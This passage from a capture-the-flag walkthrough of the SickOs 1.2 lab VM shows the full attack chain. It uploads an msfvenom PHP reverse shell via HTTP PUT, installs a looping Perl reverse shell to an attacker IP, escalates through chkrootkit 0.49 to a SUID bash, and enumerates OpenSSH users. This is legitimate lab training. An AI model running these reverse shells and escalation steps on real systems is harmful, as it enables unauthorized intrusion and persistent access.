+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div>
+    <div>payload =&gt; php/reverse_php</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 53</div>
+    <div>LPORT =&gt; 53</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 5.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:53 </div>
+    <div>msf5 exploit(multi/handler) &gt; </div>
+    <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div>
+    <div>payload =&gt; php/reverse_php</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 80</div>
+    <div>LPORT =&gt; 80</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 6.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:80 </div>
+    <div>msf5 exploit(multi/handler) &gt; </div>
+    <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div>
+    <div>payload =&gt; php/reverse_php</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 443</div>
+    <div>LPORT =&gt; 443</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 7.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:443</div>
+</div>
+<div><br /></div>
+<div>OK. All set up. Let's try that again.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# curl --url http://10.183.0.196/test/rev.php</div>
+</div>
+<div><br /></div>
+<div>Bummer. TCP port 80 didn't work. Let's recreate our rev.php file using TCP port 443 and upload again.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=443 -f raw &gt; rev.php</div>
+    <div>root@kali:~/Walkthroughs/sickos12# curl -v0T rev.php --url http://10.183.0.196/test/rev.php</div>
+    <div>root@kali:~/Walkthroughs/sickos12# curl --url http://10.183.0.196/test/rev.php</div>
+</div>
+<div><br /></div>
+<div>BINGO! That worked.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:443 -&gt; 10.183.0.196:55184) at 2019-04-22 17:58:13 -0400</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>msf5 exploit(multi/handler) &gt; sessions 1</div>
+    <div>[*] Starting interaction with 1...</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>pwd</div>
+    <div>/var/www/test</div>
+    <div>id</div>
+    <div>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+</div>
+<div><br /></div>
+<div>Unfortunately, as stated before, the PHP reverse shell doesn't stay active very long. I'll need to set up a script to make a reverse shell connection back to my attacker on TCP port 443. Thankfully, I can write the script on my attacker system and transfer it to the victim using PUT.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# cat rev.sh </div>
+    <div>#!/bin/sh</div>
+    <div>while true; do</div>
+    <div>    perl -e 'use Socket;$i="10.183.0.222";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</div>
+    <div>    # sleep for 300 seconds (5 mins)</div>
+    <div>    sleep 300</div>
+    <div>done</div>
+    <div>root@kali:~/Walkthroughs/sickos12# curl -v0T rev.sh --url http://10.183.0.196/test/rev.sh</div>
+    <div>* Expire in 0 ms for 6 (transfer 0x55d917b09d00)</div>
+    <div>*   Trying 10.183.0.196...</div>
+    <div>* TCP_NODELAY set</div>
+    <div>* Expire in 200 ms for 4 (transfer 0x55d917b09d00)</div>
+    <div>* Connected to 10.183.0.196 (10.183.0.196) port 80 (#0)</div>
+    <div>&gt; PUT /test/rev.sh HTTP/1.0</div>
+    <div>&gt; Host: 10.183.0.196</div>
+    <div>&gt; User-Agent: curl/7.64.0</div>
+    <div>&gt; Accept: */*</div>
+    <div>&gt; Content-Length: 308</div>
+    <div>&gt;</div>
+    <div>* We are completely uploaded and fine</div>
+    <div>* HTTP 1.0, assume close after body</div>
+    <div>&lt; HTTP/1.0 201 Created</div>
+    <div>&lt; Content-Length: 0</div>
+    <div>&lt; Connection: close</div>
+    <div>&lt; Date: Mon, 22 Apr 2019 22:09:41 GMT</div>
+    <div>&lt; Server: lighttpd/1.4.28</div>
+    <div>&lt;</div>
+    <div>* Closing connection 0</div>
+</div>
+<div><br /></div>
+<div>Now, I just need to connect back to the PHP reverse shell session, set rev.sh as executable and run it in the background. Once it is running, I'll disconnect from the PHP reverse shell and start a listener for the perl reverse shell. It will take about 5 minutes to get back to me, but this will also handle my "Maintaining Access" step. 🙂</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Maintaining Access</h2>
+</div>
+<div><br /></div>
+<div>See above.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Privilege Escalation</h2>
+</div>
+<div><br /></div>
+<div>Once we have a stable connection to the victim, we check the operating system information using 'uname'.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@ubuntu:/$ uname -a</div>
+    <div>Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux</div>
+</div>
+<div><br /></div>
+<div>We also check the 'os-release' file in /etc.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@ubuntu:/etc$ cat os-release</div>
+    <div>NAME="Ubuntu"</div>
+    <div>VERSION="12.04.4 LTS, Precise Pangolin"</div>
+    <div>ID=ubuntu</div>
+    <div>ID_LIKE=debian</div>
+    <div>PRETTY_NAME="Ubuntu precise (12.04.4 LTS)"</div>
+    <div>VERSION_ID="12.04"</div>
+</div>
+<div><br /></div>
+<div>Checking the exploit database, there is only one potential kernel exploit we can try.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Linux Kernel 3.11 &lt; 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation                   | exploits/linux/local/41995.c</div>
+</div>
+<div><br /></div>
+<div>We will use our DAV service to transfer the C file to the victim.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# curl -v0T 41995.c --url http://10.183.0.196/test/41995.c</div>
+</div>
+<div><br /></div>
+<div>Unfortunately, we can't get the exploit to compile on the victim or our attacking machine. Let's see what else we can find on the system.</div>
+<div><br /></div>
+<div>Looking through the cron jobs, I noticed there is a job for chkrootkit. Since I know some versions of this application are vulnerable to privilege escalation, I check the version.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@ubuntu:/etc/cron.daily$ chkrootkit -V</div>
+    <div>chkrootkit version 0.49</div>
+</div>
+<div><br /></div>
+<div>We are in luck. This is a known vulnerable version.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>Chkrootkit 0.49 - Local Privilege Escalation                                                                 | exploits/linux/local/33899.txt</div>
+</div>
+<div><br /></div>
+<div>To take advantage of this vulnerability, we just need to create an executable file named '/tmp/update' with the commands we want root to run for us. Since getting outbound connections is tricky and we don't know yet how that's working, let's just have root create a SUID version of bash for us. We'll create our script on the attacking machine and then transfer it over using PUT (like before).</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/sickos12# cat update</div>
+    <div>#!/bin/sh</div>
+    <div>chown root /tmp/bash</div>
+    <div>chmod u+s /tmp/bash</div>
+    <div>root@kali:~/Walkthroughs/sickos12# curl -v0T update --url http://10.183.0.196/test/update</div>
+</div>
+<div><br /></div>
+<div>Then, on the victim...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@ubuntu:/tmp$ cd /tmp</div>
+    <div>www-data@ubuntu:/tmp$ cp /bin/bash .</div>
+    <div>www-data@ubuntu:/tmp$ mv /var/www/test/update .</div>
+    <div>www-data@ubuntu:/tmp$ chmod +x update</div>
+</div>
+<div><br /></div>
+<div>Now, we just have to wait for the next time chkrootkit runs. Since it is set to run daily, we shouldn't have to wait more than 24-hours.</div>
+<div><br /></div>
+<div>Well... just a few minutes later... we see our commands have run...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@ubuntu:/tmp$ ls -l</div>
+    <div>total 904</div>
+    <div>-rwsr-xr-x 1 root     www-data 920788 Apr 22 15:47 bash</div>
+    <div>srwxr-xr-x 1 www-data www-data      0 Apr 22 05:38 php.socket-0</div>
+    <div>-rwxr-xr-x 1 www-data www-data     52 Apr 22 15:48 update</div>
+</div>
+<div><br /></div>
+<div>The bash executable is now owned by root and has the sticky bit set. This makes getting root a breeze.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www-data@ubuntu:/tmp$ ./bash -p</div>
+    <div>./bash -p</div>
+    <div>bash-4.2# id</div>
+    <div>id</div>
+    <div>uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)</div>
+</div>
+<div><br /></div>
+<div>Let's get that flag...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>bash-4.2# cd /root</div>
+    <div>bash-4.2# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</div>
+    <div>WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Thanks for giving this try.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>@vulnhub: Thanks for hosting this UP!.</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Pivoting</h2>
+</div>
+<div>N/A</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Clean Up</h2>
+</div>
+<div><br /></div>
+<div>*** REMOVE /var/www/test/rev.php ***</div>
+<div>*** STOP /var/www/test/rev.sh ***</div>
+<div>*** REMOVE /var/www/test/rev.sh ***</div>
+<div>*** REMOVE /tmp/bash ***</div>
+<div>*** REMOVE /tmp/update ***</div>
+<div><br /></div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Additional Info</h2>
+</div>
+<div><br /></div>
+<div><span style="font-weight: bold;">Enumerating OpenSSH Users</span></div>
+<div><br /></div>
+<div>Let's see about that user enumeration issue in OpenSSH.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>OpenSSH 2.3 &lt; 7.7 - Username Enumeration                                                                     | exploits/linux/remote/45233.py</div>
+</div>
+<div><br /></div>
+<div>I copy 45233.py from the exploit database and run it to check the options. However, I'm greeted with an error. Apparently the paramiko library has changed since the exploit was written and I need to update all references to _handler_table to _client_handler_table. After making this change, I'm able to run the script and enumerate some user accounts.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>python 45233.py --threads 4 --outputFile ssh-enum --outputFormat json --userList /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt 10.183.0.196</div>
+</div>
+<div><br /></div>
+<div>We are able to enumerate the following accounts:</div>
+<ul>
+    <li>
+        <div>backup</div>
+    </li>
+    <li>
+        <div>bin</div>
+    </li>
+    <li>
+        <div>daemon</div>
+    </li>
+    <li>
+        <div>games</div>
+    </li>
+    <li>
+        <div>gnats</div>
+    </li>
+    <li>
+        <div>irc</div>
+    </li>
+    <li>
+        <div>john</div>
+    </li>
+    <li>
+        <div>libuuid</div>
+    </li>
+    <li>
+        <div>list</div>
+    </li>
+    <li>
+        <div>lp</div>
+    </li>
+    <li>
+        <div>mail</div>
+    </li>
+    <li>
+        <div>man</div>
+    </li>
+    <li>
+        <div>messagebus</div>
+    </li>
+    <li>
+        <div>news</div>
+    </li>
+    <li>
+        <div>nobody</div>
+    </li>
+    <li>
+        <div>proxy</div>
+    </li>
+    <li>
+        <div>root</div>
+    </li>
+    <li>
+        <div>sshd</div>
+    </li>
+    <li>
+        <div>sync</div>
+    </li>
+    <li>
+        <div>sys</div>
+    </li>
+    <li>
+        <div>syslog</div>
+    </li>
+    <li>
+        <div>uucp</div>
+    </li>
+    <li>
+        <div>www-data</div>
+    </li>
+</ul>
+<div><br /></div>
+<div><br /></div>
+<div><span style="font-weight: bold;">iptables</span></div>
+<div><br /></div>
+<div>Checking the iptables after we got root, it appears the only other outbound port that would have worked was 8080.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@ubuntu:~# iptables-save</div>
+    <div># Generated by iptables-save v1.4.12 on Mon Apr 22 16:08:25 2019</div>
+    <div>*filter</div>
+    <div>:INPUT DROP [165904:10347077]</div>
+    <div>:FORWARD ACCEPT [0:0]</div>
+    <div>:OUTPUT DROP [72522:5152658]</div>
+    <div>-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT</div>
+    <div>-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT</div>
+    <div>-A INPUT -p tcp -m tcp --sport 8080 -j ACCEPT</div>
+    <div>-A INPUT -p tcp -m tcp --sport 443 -j ACCEPT</div>
+    <div>-A OUTPUT -p tcp -m tcp --sport 22 -j ACCEPT</div>
+    <div>-A OUTPUT -p tcp -m tcp --sport 80 -j ACCEPT</div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">-A OUTPUT -p tcp -m tcp --dport 8080 -j ACCEPT</font>
+    </div>
+    <div>
+        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">-A OUTPUT -p tcp -m tcp --dport 443 -j ACCEPT</font>
+    </div>
+    <div>COMMIT</div>
+    <div># Completed on Mon Apr 22 16:08:25 2019</div>
+</div>
+<div><br /></div>
+<div>There are also some interesting "source port" rules. So, you could open a bind shell on any port on the victim, but you'd have to specify a source port of 443 or 8080 to reach it. Or, you could do a reverse shell from the victim, but you'd have to specify a source port of 22 or 80 for having it reach back to the attacker (which would require root, to bind to the low ports). You can use the -p option in netcat (when acting as a client) to specify your source port.</div>
+<div><br /></div>
+<div><br /></div>
+<div><span style="font-weight: bold;">/etc/cron.d</span></div>
+<div><br /></div>
+<div>I wasn't able to access the cron.d folder as a limited user. Once I got root, I went to see why. Turns out, this is where chkrootkit is set to run every minute (which is why I was able to elevate privs so quickly... thankfully).</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@ubuntu:/etc/cron.d# cat chkrootkit </div>
+    <div>* * * * * root /usr/sbin/chkrootkit</div>
+</div>
+<div><br /></div>
+<div><br /></div>
+<div><br /></div>
+<div><br /></div>
+<div><br /></div>
+<div><br /></div>
